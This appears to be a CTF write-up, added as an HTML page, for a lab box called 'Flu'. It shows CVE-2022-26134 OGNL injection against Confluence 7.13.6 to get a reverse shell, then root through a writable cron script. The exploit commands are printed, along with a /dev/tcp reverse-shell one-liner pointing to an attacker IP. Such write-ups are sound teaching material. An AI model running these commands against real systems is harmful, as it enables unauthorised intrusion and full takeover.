@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Flu &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Flu</h1>
+    <div class="meta">Target: <code>192.168.183.41</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">AtlassianConfluence</span><span class="tag">CVE</span><span class="tag">RCE</span><span class="tag">pspy</span><span class="tag">cron</span><span class="tag">WritableCronScript</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#confluence-version">Confluence Version</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#cve-2022-26134-unauthenticated-ognl-injection">CVE-2022-26134, Unauthenticated OGNL Injection</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#writable-cron-script-running-as-root">Writable Cron Script Running as Root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Flu is a Linux box running Atlassian Confluence 7.13.6 on port 8090. That version is vulnerable to CVE-2022-26134, an unauthenticated OGNL injection that gives remote code execution. A purpose-built exploit script delivers a reverse shell as <code>confluence</code>. Privilege escalation comes from a root-owned cron job that runs <code>/opt/log-backup.sh</code> every minute, a script owned by the <code>confluence</code> user, making it directly writable. Appending a reverse shell to the script gets root execution within the minute.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 9.0p1 Ubuntu 1ubuntu8.5
+8090/tcp open  opsmessaging?
+| fingerprint-strings:
+|   GetRequest:
+|     Location: http://localhost:8090/login.action?os_destination=%2Findex.action
+</code></pre>
+<p>The redirect to <code>login.action</code> identifies Atlassian Confluence immediately. The Nmap fingerprint doesn't name it, but the URL pattern is unmistakable.</p>
+<h3 id="confluence-version">Confluence Version</h3>
+<p>The login page confirms:</p>
+<pre><code>Powered by Atlassian Confluence 7.13.6
+</code></pre>
+<p>Searching for this version reveals <strong>CVE-2022-26134</strong>, an unauthenticated remote code execution via OGNL template injection in the <code>/${...}</code> URI parameter.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cve-2022-26134-unauthenticated-ognl-injection">CVE-2022-26134, Unauthenticated OGNL Injection</h3>
+<p>A quick PoC confirms code execution:</p>
+<pre><code class="language-sh">python3 CVE-2022-26134.py http://192.168.183.41:8090/ id
+Confluence target version: 7.13.6
+uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
+</code></pre>
+<blockquote>
+<p><strong>How CVE-2022-26134 works:</strong> Confluence evaluates OGNL (Object-Graph Navigation Language) expressions embedded in HTTP request URIs when processing certain endpoints. The <code>${...}</code> syntax in the URI is passed to the OGNL interpreter before authentication is checked, allowing arbitrary Java method invocation, including <code>Runtime.exec()</code>. No credentials, no session, no login required.</p>
+</blockquote>
+<p>Standard reverse shell payloads failed with the basic PoC. A dedicated exploit with a built-in reverse shell function works:</p>
+<pre><code class="language-sh">python3 through_the_wire.py --rhost 192.168.183.41 --rport 8090 --lhost 192.168.45.244 --lport 443 --protocol http:// --reverse-shell
+
+[+] Forking a netcat listener
+[+] Generating a reverse shell payload
+[+] Sending exploit at http://192.168.183.41:8090/
+listening on [any] 443 ...
+connect to [192.168.45.244] from (UNKNOWN) [192.168.183.41] 58130
+
+confluence@flu:/opt/atlassian/confluence/bin$ whoami
+confluence
+</code></pre>
+<p>Local flag retrieved:</p>
+<pre><code class="language-sh">confluence@flu:/home/confluence$ cat local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="writable-cron-script-running-as-root">Writable Cron Script Running as Root</h3>
+<p>LinPEAS doesn't surface obvious privesc paths, but <code>pspy</code> (a process monitor that watches fork/exec events without root) reveals a recurring root command:</p>
+<pre><code class="language-sh">2024/07/15 15:41:01 CMD: UID=0  PID=25472  | /bin/sh -c /opt/log-backup.sh
+2024/07/15 15:41:01 CMD: UID=0  PID=25474  | /bin/bash /opt/log-backup.sh
+</code></pre>
+<p>Checking the script permissions:</p>
+<pre><code class="language-sh">-rwxr-xr-x  1 confluence confluence  408 Dec 12  2023 log-backup.sh
+</code></pre>
+<p>The script is owned by <code>confluence</code> with write permissions, the current user can modify it freely. The script itself:</p>
+<pre><code class="language-sh">#!/bin/bash
+CONFLUENCE_HOME=&quot;/opt/atlassian/confluence/&quot;
+LOG_DIR=&quot;$CONFLUENCE_HOME/logs&quot;
+BACKUP_DIR=&quot;/root/backup&quot;
+TIMESTAMP=$(date &quot;+%Y%m%d%H%M%S&quot;)
+
+cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP
+tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP
+find $BACKUP_DIR -name &quot;log_backup_*&quot; -mmin +5 -exec rm -rf {} \;
+</code></pre>
+<blockquote>
+<p><strong>Why owning the script file beats everything else:</strong> Linux file permissions check who owns the file to determine who can write to it. Even though root executes <code>/opt/log-backup.sh</code>, the file's owner is <code>confluence</code>. The running process's identity (root) is irrelevant for the write permission check, only the file owner matters. So <code>confluence</code> can overwrite the contents of a script that root will execute on the next cron tick.</p>
+</blockquote>
+<p>Append a reverse shell to the script:</p>
+<pre><code class="language-sh">echo 'sh -i &gt;&amp; /dev/tcp/192.168.45.244/53 0&gt;&amp;1' &gt;&gt; /opt/log-backup.sh
+</code></pre>
+<p>Set up the listener and wait less than a minute:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [192.168.45.244] from (UNKNOWN) [192.168.183.41] 33182
+# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>CVE-2022-26134 is pre-auth.</strong> No credentials needed to get a shell on unpatched Confluence, version identification alone closes the loop from discovery to RCE.</li>
+<li><strong><code>pspy</code> finds privesc paths that LinPEAS misses.</strong> Static analysis tools look at file permissions and SUID bits. <code>pspy</code> watches what actually runs, catching cron jobs that execute scripts in non-standard locations.</li>
+<li><strong>File ownership, not file permissions, controls who can write.</strong> A root-executed script is only protected if root owns it. Leaving ownership with a service user (like <code>confluence</code>) means the service user can rewrite it.</li>
+<li><strong>Always check script ownership after finding a root cron job.</strong> The combination of "root runs this" and "non-root owns the file" is an immediate privesc.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
